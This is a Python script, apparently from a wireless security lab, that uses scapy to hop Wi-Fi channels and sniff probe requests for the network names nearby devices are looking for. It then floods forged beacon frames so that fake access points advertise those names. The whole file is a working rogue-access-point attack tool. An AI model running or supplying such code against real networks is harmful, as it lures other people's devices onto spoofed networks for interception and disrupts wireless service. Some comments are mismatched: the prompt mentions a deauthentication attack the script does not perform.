from scapy.all import *
import time
import threading
import os


SSIDs = set()

# Let user select network interface to perform attack
while(True): # Emulating do while in python
    ifaces = get_if_list() # Get interfaces in loop in case a new one appears
    iface = input(f"Name of desired interface to perform deauthentication attack {ifaces}: ")

    if(iface in ifaces):
        break

# Scan network on all channel
def change_channel(stop):
	ch = 1
	while True:
		os.system(f"iwconfig {iface} channel {ch}")
		# switch channel from 1 to 14 each 0.5s
		ch = ch % 14 + 1
		time.sleep(0.1)

		if stop():
			break

# Called when sniff receive a packet
def callback(packet):
    if packet.haslayer(Dot11ProbeReq):
        # extract the SSID address of the network
        probeReq = packet[Dot11ProbeReq]
        SSID = probeReq.info.decode("utf-8")

        print(".", end="", flush=True)

        if SSID:
            SSIDs.add(SSID)


# Advertise an AP 
def advertise_ap(ssid):
	# Create a beacon
	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr3=RandMAC()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
	print(f"\nCreating new network {ssid}")
	sendp(p, inter=0.000000000002, iface=iface, loop=1)


stop_threads = False

# start the channel changer
channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
channel_changer.daemon = True
channel_changer.start()


# Sniff wifi packets for x seconds
SNIFF_DURATION = 30
print(f"Sniffing for {SNIFF_DURATION} seconds...")
sniff(prn=callback, iface=iface, timeout=SNIFF_DURATION)



# Display found SSIDs
if len(SSIDs) > 0:
    print(f"\n{len(SSIDs)} ssid found")

    for SSID in SSIDs:
        print(f"\t{SSID}")
else:
    print("\n No ssid found")
    exit()


# Run a thread for each ssid
for SSID in SSIDs:
	aa = Thread(target=advertise_ap, args=(SSID,))
	aa.daemon = True
	aa.start()


input("Press any key to exit")
stop_threads = True
